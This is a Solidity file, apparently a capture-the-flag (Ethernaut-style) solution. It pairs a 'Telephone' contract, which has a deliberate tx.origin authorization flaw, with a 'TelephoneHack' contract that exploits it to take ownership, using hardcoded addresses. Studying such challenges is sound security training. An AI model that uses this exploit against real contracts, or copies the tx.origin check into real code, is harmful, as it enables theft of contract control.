pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {
    function attack() public {
        
        address contractAddress = 0x638f7A3DF5683Fd9b22eC153bf888Ca16e5F1De7;
        
        // contract address of Telephone
        
        Telephone originalPhoneContract = Telephone(contractAddress);
        
        // Storing contract address of Telephone in variable originalPhoneContract
        
        originalPhoneContract.changeOwner(0x2E5090E6f147B84Aa6bBe6483acD3AfBedECCdDB);
    }
    
        // calling changeOwner() with new address to Telephone contract 
}

/* To exploit this contract, the attacker will need to call the changeOwner() function. Once the exploit contract is deployed, 
the attacker will be able to claim ownership of Telephone contract. 
*/
